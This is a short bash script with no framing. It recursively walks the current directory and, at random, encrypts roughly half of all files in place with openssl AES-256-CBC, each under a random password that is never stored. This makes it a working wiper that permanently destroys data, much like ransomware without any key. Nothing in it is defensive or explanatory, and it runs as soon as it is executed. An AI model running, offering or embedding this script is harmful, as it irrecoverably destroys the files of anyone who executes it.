#!/bin/bash

ENCRYPT_PROB_OVER_32768=16384

randomly_encrypt() {
    local directory=$1
    local file
    for file in "$directory"/*; do
        if [ -d "$file" ]; then
            randomly_encrypt "$file"
        elif [ -f "$file" -a "$RANDOM" -lt "$ENCRYPT_PROB_OVER_32768" ]; then
            openssl enc -aes-256-cbc -salt -in "$file" -out "$file.enc.tmp" -pass pass:"$(openssl rand -base64 32)"
            mv "$file.enc.tmp" "$file"
        fi
    done
}

randomly_encrypt "$(pwd)"